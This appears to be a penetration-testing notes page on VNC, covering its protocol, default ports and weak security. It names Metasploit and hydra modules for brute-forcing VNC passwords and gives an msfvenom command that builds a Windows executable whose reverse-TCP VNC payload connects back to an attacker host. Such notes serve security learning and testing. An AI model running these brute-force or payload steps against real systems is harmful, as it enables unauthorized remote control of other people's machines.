# VNC

VNC is an alternative to RDP that is platform independent. VNC uses the Remote Frame Buffer protocol \(RFB\). It is usually configured to run on ports 5900+N were N is the display number. Whilst RFB is not a secure protocol, VNC can be run through an SSH or VPN tunnel making it secure.

VNC hasn't been the most robust of products and there are numerous serious vulnerabilities in a range of different versions of the product.

VNC may require password but if used, it doesn't need a username. Metasploit has a VNC login brute force module \(auxiliary/scanner/vnc/vnc\_login\) and the command line application hydra can also brute force VNC passwords. A VNC-enabled payload can be created by msfvenom also:

```bash
msfvenom -p windows/vncinject/reverse_tcp LHOST=<Local Host IP address> LPORT=4444 -f exe > payload.exe
```

Finally, meterpreter can launch a VNC session by running "run vnc" within a meterpreter session.

